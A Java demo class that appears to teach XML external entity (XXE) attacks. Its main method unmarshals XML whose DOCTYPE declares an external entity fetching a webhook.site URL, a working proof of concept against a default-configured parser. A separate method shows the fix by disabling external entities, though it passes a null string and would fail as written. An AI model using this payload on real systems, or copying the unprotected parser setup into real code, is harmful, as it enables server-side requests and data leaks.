package com.example.demo.xxe;

import java.io.StringReader;
import java.io.StringWriter;

import javax.xml.bind.JAXBContext;
import javax.xml.bind.JAXBElement;
import javax.xml.bind.JAXBException;
import javax.xml.bind.Marshaller;
import javax.xml.bind.Unmarshaller;
import javax.xml.parsers.ParserConfigurationException;
import javax.xml.parsers.SAXParserFactory;
import javax.xml.stream.XMLInputFactory;
import javax.xml.stream.XMLStreamException;
import javax.xml.stream.XMLStreamReader;
import javax.xml.transform.Result;
import javax.xml.transform.sax.SAXSource;

import org.xml.sax.InputSource;
import org.xml.sax.SAXException;
import org.xml.sax.SAXNotRecognizedException;
import org.xml.sax.SAXNotSupportedException;

public class Exploit1 {

	public static void main(String[] args) throws JAXBException, XMLStreamException {
		
		JAXBContext context = JAXBContext.newInstance(Userx.class);
		Unmarshaller unmarshaller = context.createUnmarshaller();
		XMLInputFactory factory = XMLInputFactory.newFactory();
		String xml =
		    "<?xml version=\"1.0\"?>\n"
				+"<!DOCTYPE example ["
				+ "<!ENTITY xxe SYSTEM \"https://webhook.site/9e10048d-1cf5-4628-b0e2-55e9200db2fe\">]>\n"
		        + "<userx>\n"
		        + "  <username>&xxe;</username>\n"
		        + "</userx>";
		XMLStreamReader reader = factory.createXMLStreamReader(new StringReader(xml));
		JAXBElement<Userx> element = unmarshaller.unmarshal(reader, Userx.class);
		Userx user = element.getValue();
		System.out.println(user.getUsername());
		StringWriter sw = new StringWriter();
		 Marshaller marshaller = context.createMarshaller();
        marshaller.setProperty(Marshaller.JAXB_FORMATTED_OUTPUT, true);
        Result xx ;
        
        marshaller.marshal(element, sw);
        String result = sw.toString();
        System.out.println(result);

	}

	
	public void solution() throws ParserConfigurationException, SAXException, JAXBException
	{
		//Disable XXE
		SAXParserFactory spf = SAXParserFactory.newInstance();
		spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
		spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
		spf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

		String xml = null;
		//Do unmarshall operation
		 SAXSource xmlSource = new SAXSource(spf.newSAXParser().getXMLReader(),
		                                new InputSource(new StringReader(xml)));
		JAXBContext jc = JAXBContext.newInstance(Object.class);
		Unmarshaller um = jc.createUnmarshaller();
		um.unmarshal(xmlSource);
	}
}
